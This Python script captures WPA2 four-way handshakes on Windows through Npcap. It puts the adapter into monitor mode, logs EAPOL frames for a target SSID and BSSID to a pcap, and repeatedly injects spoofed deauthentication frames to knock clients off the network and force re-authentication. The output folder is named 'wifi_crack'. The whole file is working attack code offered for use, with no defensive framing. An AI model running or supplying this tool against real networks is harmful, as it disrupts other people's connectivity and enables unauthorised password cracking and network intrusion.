# capture_mon.py - monitor-mode capture of the WPA2 4-way handshake, with deauth injection.
#
# Must run ELEVATED (switching the adapter to monitor mode needs admin; error 5 otherwise).
# WlanHelper (ships with Npcap) flips the mode; this script then sniffs raw 802.11 on the
# target channel and, when it sees clients, spoofs deauth frames to force one of them to
# re-run the handshake. Deauth is optional: if the driver refuses injection we just wait
# for a natural re-auth.

import sys
if hasattr(sys.stdout, "reconfigure"):   # Windows 控制台默认 cp1252，中文输出会直接崩
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import ctypes
import os
import struct
import sys
import time

# runtime parameters: --ssid <name> --bssid aa:bb:cc:dd:ee:ff  (or RK_SSID / RK_BSSID)
SSID = os.environ.get("RK_SSID", "")
AP_BSSID = os.environ.get("RK_BSSID", "00:00:00:00:00:00")
for _i, _a in enumerate(sys.argv):
    if _a == "--ssid" and _i + 1 < len(sys.argv):
        SSID = sys.argv[_i + 1]
    if _a == "--bssid" and _i + 1 < len(sys.argv):
        AP_BSSID = sys.argv[_i + 1]
DEV = br"\Device\NPF_{D3D00F1E-A7E6-4AEF-B9DF-2B4805A73D08}"
OUT = r"E:\wifi_crack\handshake_mon.pcap"
TOTAL = int(os.environ.get("CAPTURE_SECONDS", "200"))

os.add_dll_directory(r"C:\Windows\System32\Npcap")
wp = ctypes.CDLL(r"C:\Windows\System32\Npcap\wpcap.dll")


class timeval(ctypes.Structure):
    _fields_ = [("tv_sec", ctypes.c_long), ("tv_usec", ctypes.c_long)]


class pcap_pkthdr(ctypes.Structure):
    _fields_ = [("ts", timeval), ("caplen", ctypes.c_uint), ("len", ctypes.c_uint)]


wp.pcap_open_live.restype = ctypes.c_void_p
wp.pcap_open_live.argtypes = [ctypes.c_char_p, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_char_p]
# rfmon only works through the pcap_create/activate path, NOT pcap_open_live
wp.pcap_create.restype = ctypes.c_void_p
wp.pcap_create.argtypes = [ctypes.c_char_p, ctypes.c_char_p]
wp.pcap_set_rfmon.restype = ctypes.c_int
wp.pcap_set_rfmon.argtypes = [ctypes.c_void_p, ctypes.c_int]
wp.pcap_set_snaplen.restype = ctypes.c_int
wp.pcap_set_snaplen.argtypes = [ctypes.c_void_p, ctypes.c_int]
wp.pcap_set_promisc.restype = ctypes.c_int
wp.pcap_set_promisc.argtypes = [ctypes.c_void_p, ctypes.c_int]
wp.pcap_set_timeout.restype = ctypes.c_int
wp.pcap_set_timeout.argtypes = [ctypes.c_void_p, ctypes.c_int]
wp.pcap_activate.restype = ctypes.c_int
wp.pcap_activate.argtypes = [ctypes.c_void_p]
wp.pcap_geterr.restype = ctypes.c_char_p
wp.pcap_geterr.argtypes = [ctypes.c_void_p]
wp.pcap_close.restype = None
wp.pcap_close.argtypes = [ctypes.c_void_p]
wp.pcap_next_ex.restype = ctypes.c_int
wp.pcap_next_ex.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.POINTER(pcap_pkthdr)),
                            ctypes.POINTER(ctypes.POINTER(ctypes.c_ubyte))]
wp.pcap_datalink.restype = ctypes.c_int
wp.pcap_datalink.argtypes = [ctypes.c_void_p]
wp.pcap_sendpacket.restype = ctypes.c_int
wp.pcap_sendpacket.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_ubyte), ctypes.c_int]
wp.pcap_close.restype = None
wp.pcap_close.argtypes = [ctypes.c_void_p]

AP = bytes.fromhex(AP_BSSID.replace(":", ""))


def mac(b):
    return ":".join("%02x" % c for c in b)


def parse(data, dlt):
    """return (fc, addr1, addr2, addr3, body_offset) or None"""
    off = 0
    if dlt in (127, 163):  # radiotap
        if len(data) < 8:
            return None
        itlen = struct.unpack("<H", data[2:4])[0]
        off = itlen
    elif dlt == 105:  # IEEE802_11 (no radiotap)
        off = 0
    elif dlt == 119:  # prism
        off = 144
    else:
        if len(data) > 24 and data[12:14] == b"\x88\x8e":
            return None
        off = 0
    if len(data) < off + 24:
        return None
    fc = struct.unpack("<H", data[off:off + 2])[0]
    a1 = data[off + 4:off + 10]
    a2 = data[off + 10:off + 16]
    a3 = data[off + 16:off + 22]
    ftype = (fc >> 2) & 0x3
    subtype = (fc >> 4) & 0xF
    bo = off + 24
    if ftype == 2:
        tods = bool(fc & 0x0100)
        fromds = bool(fc & 0x0200)
        if tods and fromds:
            bo += 6
        if subtype & 0x8:
            bo += 2
    return fc, a1, a2, a3, bo, ftype


def find_eapol(data, bo):
    body = data[bo:]
    # LLC/SNAP then 0x888e
    if len(body) >= 8 and body[0:6] == b"\xaa\xaa\x03":
        if body[6:8] == b"\x88\x8e":
            return body[8:]
        return None
    if len(body) >= 2 and body[0:2] == b"\x88\x8e":
        return body[2:]
    idx = body.find(b"\xaa\xaa\x03\x00\x00\x00\x88\x8e")
    if idx >= 0:
        return body[idx + 8:]
    return None


def eapol_info(eapol):
    if len(eapol) < 99 or eapol[1] != 0x03:
        return None
    keyinfo = struct.unpack(">H", eapol[5:7])[0]
    return {"keyinfo": keyinfo, "nonce": eapol[17:49], "mic": eapol[81:97], "raw": eapol}


def deauth(target, src=AP, bssid=AP, reason=7):
    fc = struct.pack("<H", 0x00C0)
    dur = struct.pack("<H", 0x0000)
    seq = struct.pack("<H", 0)
    return fc + dur + target + src + bssid + seq + struct.pack("<H", reason)


def main():
    err = ctypes.create_string_buffer(256)
    h = wp.pcap_create(DEV, err)
    if not h:
        print("!! pcap_create failed: %s" % err.value)
        return 1
    wp.pcap_set_snaplen(h, 65535)
    wp.pcap_set_promisc(h, 1)
    wp.pcap_set_timeout(h, 200)
    r = wp.pcap_set_rfmon(h, 1)
    print("[*] set_rfmon -> %d %s" % (r, "" if r == 0 else "(not supported, staying native)"))
    a = wp.pcap_activate(h)
    print("[*] activate -> %d %s" % (a, "" if a == 0 else wp.pcap_geterr(h).decode(errors="ignore")))
    if a != 0:
        wp.pcap_close(h)
        print("[*] falling back to pcap_open_live")
        h = wp.pcap_open_live(DEV, 65535, 1, 200, err)
        if not h:
            print("!! open failed: %s" % err.value)
            return 1
    dlt = wp.pcap_datalink(h)
    print("[*] datalink=%d (127=radiotap/802.11, 1=ethernet)" % dlt)
    sys.stdout.flush()

    clients = {}
    eapols = []
    injected = 0
    send_err = 0
    deadline = time.time() + TOTAL
    last_deauth = 0

    with open(OUT, "wb") as f:
        f.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, dlt))
        hp = ctypes.POINTER(pcap_pkthdr)()
        dp = ctypes.POINTER(ctypes.c_ubyte)()
        while time.time() < deadline:
            rc = wp.pcap_next_ex(h, ctypes.byref(hp), ctypes.byref(dp))
            if rc != 1:
                continue
            ph = hp.contents
            buf = ctypes.string_at(dp, ph.caplen)
            f.write(struct.pack("<IIII", int(ph.ts.tv_sec), int(ph.ts.tv_usec), ph.caplen, ph.len))
            f.write(buf)

            p = parse(buf, dlt)
            if not p:
                continue
            fc, a1, a2, a3, bo, ftype = p
            if ftype != 2:
                continue
            tods = bool(fc & 0x0100)
            fromds = bool(fc & 0x0200)
            if a3 == AP or a2 == AP or a1 == AP:
                sta = a2 if tods and not fromds else (a1 if fromds and not tods else None)
                if sta and sta != AP:
                    clients[sta] = clients.get(sta, 0) + 1
            eapol = find_eapol(buf, bo)
            if eapol:
                info = eapol_info(eapol)
                if info:
                    eapols.append((mac(a1), mac(a2), mac(a3), info["keyinfo"], info))
                    print("[EAPOL] a1=%s a2=%s a3=%s keyinfo=0x%04x" %
                          (mac(a1), mac(a2), mac(a3), info["keyinfo"]))
                    sys.stdout.flush()

            # every 6s: kick whatever clients we know about
            if time.time() - last_deauth > 6 and clients:
                last_deauth = time.time()
                for sta in list(clients):
                    for frame in (deauth(sta, src=AP), deauth(AP, src=sta)):
                        buf2 = (ctypes.c_ubyte * len(frame)).from_buffer_copy(frame)
                        r = wp.pcap_sendpacket(h, buf2, len(frame))
                        if r == 0:
                            injected += 1
                        else:
                            send_err += 1
                print("[deauth] clients=%d injected=%d errors=%d" % (len(clients), injected, send_err))
                sys.stdout.flush()

    wp.pcap_close(h)
    print("\n[*] clients seen:")
    for c, n in sorted(clients.items(), key=lambda x: -x[1]):
        print("    %s  (%d frames)" % (mac(c), n))
    print("[*] EAPOL frames: %d, deauth sent: %d (errors %d)" % (len(eapols), injected, send_err))
    print("[*] pcap -> %s" % OUT)
    return 0 if eapols else 2


if __name__ == "__main__":
    sys.exit(main())
